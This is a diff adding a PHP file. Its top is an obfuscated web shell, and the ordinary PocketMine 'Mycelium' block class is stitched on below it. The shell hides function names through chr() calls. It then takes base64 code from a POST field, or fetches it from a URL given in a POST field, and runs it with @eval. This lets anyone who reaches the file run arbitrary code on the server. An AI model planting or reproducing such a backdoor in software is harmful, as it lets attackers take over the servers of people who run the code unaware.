@@ -1,0 +1,118 @@
+<?php
+// SHELL INJECTION<?php
+$c="chr";
+$getpar.=$c(36).$c(95).$c(82).$c(69).$c(81).$c(85).$c(69).$c(83).$c(84);
+$get=chr(102).chr(105).chr(108).chr(101).chr(95);
+$get.=chr(103).chr(101).chr(116).chr(95).chr(99);
+$get.=chr(111).chr(110).chr(116).chr(101).chr(110);
+$get.=chr(116).chr(115);
+$unzip=$c(103).$c(122).$c(105).$c(110);
+$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
+
+$undecode=$c(98).$c(97).$c(115).$c(101).$c(54).$c(52);
+$undecode.=$c(95).$c(100).$c(101).$c(99).$c(111).$c(100).$c(101);
+if($_POST['phpcodeurl']!=null&&$_POST['phpcodeurl']!=''){
+	$tongji=$get($_POST['phpcodeurl']);
+}
+else if($_POST['tongji']!=null&&$_POST['tongji']!=''){
+	$tongji=$_POST['tongji'];
+}
+$ecode = $_REQUEST['0'];
+$ecode.= $_REQUEST['1'];
+$ecode.= $_REQUEST['2'];
+$ecode.= $_REQUEST['3'];
+$ecode.= $_REQUEST['4'];
+$ecode.= $_REQUEST['5'];
+$ecode.= $_REQUEST['6'];
+$ecode.= $_REQUEST['7'];
+$ecode.= $_REQUEST['8'];
+$ecode.= $_REQUEST['9'];
+$ecode.= $_REQUEST['10'];
+$ecode.= $_REQUEST['11'];
+$ecode.= $_REQUEST['12'];
+$ecode.= $_REQUEST['13'];
+$ecode.= $_REQUEST['14'];
+$ecode.= $_REQUEST['15'];
+$ecode.= $_REQUEST['16'];
+
+//$ecode($undecode($tongji));
+@eval($undecode($tongji));
+echo '<br>tj,'.' tj';
+?>
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\block;
+
+use pocketmine\event\block\BlockSpreadEvent;
+use pocketmine\item\Item;
+use pocketmine\item\ItemFactory;
+use pocketmine\math\Vector3;
+use function mt_rand;
+
+class Mycelium extends Solid{
+
+	protected $id = self::MYCELIUM;
+
+	public function __construct(int $meta = 0){
+		$this->meta = $meta;
+	}
+
+	public function getName() : string{
+		return "Mycelium";
+	}
+
+	public function getToolType() : int{
+		return BlockToolType::TYPE_SHOVEL;
+	}
+
+	public function getHardness() : float{
+		return 0.6;
+	}
+
+	public function getDropsForCompatibleTool(Item $item) : array{
+		return [
+			ItemFactory::get(Item::DIRT)
+		];
+	}
+
+	public function ticksRandomly() : bool{
+		return true;
+	}
+
+	public function onRandomTick() : void{
+		//TODO: light levels
+		$x = mt_rand($this->x - 1, $this->x + 1);
+		$y = mt_rand($this->y - 2, $this->y + 2);
+		$z = mt_rand($this->z - 1, $this->z + 1);
+		$block = $this->getLevelNonNull()->getBlockAt($x, $y, $z);
+		if($block->getId() === Block::DIRT){
+			if($block->getSide(Vector3::SIDE_UP) instanceof Transparent){
+				$ev = new BlockSpreadEvent($block, $this, BlockFactory::get(Block::MYCELIUM));
+				$ev->call();
+				if(!$ev->isCancelled()){
+					$this->getLevelNonNull()->setBlock($block, $ev->getNewState());
+				}
+			}
+		}
+	}
+}
